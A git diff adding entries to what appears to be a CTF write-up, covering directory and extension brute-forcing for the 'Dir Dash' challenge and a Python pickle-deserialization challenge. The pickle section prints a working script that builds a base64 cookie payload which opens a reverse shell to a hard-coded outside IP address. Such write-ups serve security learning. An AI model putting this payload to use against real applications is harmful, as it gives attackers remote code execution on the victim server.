@@ -338,11 +338,56 @@ Hheheh we got a flag   **CTF{3sc4l4t3d_t0_r00t}**
 >
 >https://sites.google.com/cybermaterial.com/hashing-numbers
 
-I was not able to figure out what to do`
+I was not able to figure out what to do i thought of executing **shell=0&pwn=1** didn't worked. After reading Descreption again & One of my friend given Hint to inspect page & i got this.  
+<img src="Images/Hashing Numbers.png" alt="Challenge Image" width="200"/>  
 
 
 
 
+**Challenge** - **Dir Dash**
+
+> Welcome to the wackiest web quest of your life! 🚀 Somewhere in the depths of our webpage jungle you have Me.Let the digital madness begin! 🕵️‍♂️💻💥
+>
+> http://edition1.ctf.cybermaterial.com/
+
+< **Hints** >
+> Hint for Dir Dash Domain//////hash............extensions
+> hash as a directory and extensions with a hash what a combination lol
+> Dir  as a hash  OR  hash as a dir Or extensions  with a hash 
 
 
+After reading Hint's i got they stressed is **Domain//////hash............extensions** So i tried brute force i got http://edition1.ctf.cybermaterial.com/robots.txt in this i got 2 hashes **c5ba7ff1883453170f7590fa689f1f48**, ***M8PQFA3ELTD%4BIA73EZ2** . For *M8PQFA3ELTD%4BIA73EZ2 i was not able decrypt it any way & i thought c5ba7ff1883453170f7590fa689f1f48 is valid. And i brute fourced using this one...... https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/File-Extensions-Wordlist.txt  like http://edition1.ctf.cybermaterial.com/c5ba7ff1883453170f7590fa689f1f48.FUFF Finally i got 1 200 ok ( http://edition1.ctf.cybermaterial.com/c5ba7ff1883453170f7590fa689f1f48.aspx ) & Sucessfully got flag.
+
+
+
+**Challenge** - **Pickle Me This Cookie Jar Shenanigans!**
+
+> Ever wondered what your cookies are hiding? This challenge dives into the mysterious world of serialized cookies with a twist of deserialization vulnerability. Use your Python skills and the pickle module to create a mischievous cart item that leads to a netcat reverse shell. Follow the breadcrumbs, set your traps, and see if you can hack your way to victory
+
+TBH at starting i know nothing about deserialization vulnerability seen few youtube video's & blogs to know how it work's 
+ ( https://www.youtube.com/watch?v=qt15PnF8x-M ) ,( https://www.youtube.com/watch?v=NfLGOuHLjIo ) Helped me a lot.
+
+ 
+```shell
+#!/usr/bin/env python3
+import pickle
+import os
+import base64
+import requests
+
+class RCE(object):
+    def __reduce__(self):
+        return (os.system,('''export RHOST="54.226.234.236";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")' ''',))
+
+def main():
+    pickledPayload = base64.b64encode(pickle.dumps(RCE())).decode()
+    print(f'[*] Generated malicious cookie payload: {pickledPayload}')
+
+if __name__ == '__main__':
+    main()
+```
+
+After executinh rever shell i got controll in flag.md there is a flag **CM{c0Ngr47S_y0u_ArE_A_Ser1A1_KI11er}**
+
+----------------
 
